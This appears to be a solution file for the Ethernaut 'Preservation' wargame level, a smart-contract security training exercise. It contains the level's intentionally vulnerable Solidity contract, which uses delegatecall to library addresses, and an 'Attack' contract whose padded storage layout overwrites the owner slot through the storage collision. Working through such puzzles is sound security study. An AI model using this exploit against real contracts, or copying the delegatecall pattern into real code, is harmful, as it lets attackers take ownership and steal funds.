pragma solidity >=0.4.24 <0.6.0;

// https://ethernaut.openzeppelin.com/level/0xe3545ebaa3a0381ebd9f0868ae61b5dc89962ef5
contract SamplePreservation {

    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint public storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _addr1, address _addr2) public {
        timeZone1Library = _addr1;
        timeZone2Library = _addr2;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {

    // stores a timestamp
    uint public storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}


contract Attack {
  uint padding1;
  uint padding2;
  address public owner;

  function setTime(uint _time) public {
      owner = tx.origin;
  }
}